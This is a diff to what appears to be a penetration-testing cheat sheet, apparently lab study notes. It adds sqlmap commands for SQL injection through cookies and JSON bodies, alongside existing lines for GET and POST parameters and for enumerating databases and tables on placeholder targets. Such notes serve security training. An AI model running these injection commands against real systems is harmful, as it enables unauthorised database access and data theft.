@@ -23,6 +23,9 @@ Page Type Fuzzing
 SQLmap
 - GET: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php?id=1"`
 - POST: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1"`
+- Cookies: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --cookie="id=1*"`
+- JSON:  `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "{'id':1*}"`
+
 
 1. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" --dbs`
 2. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> --tables`
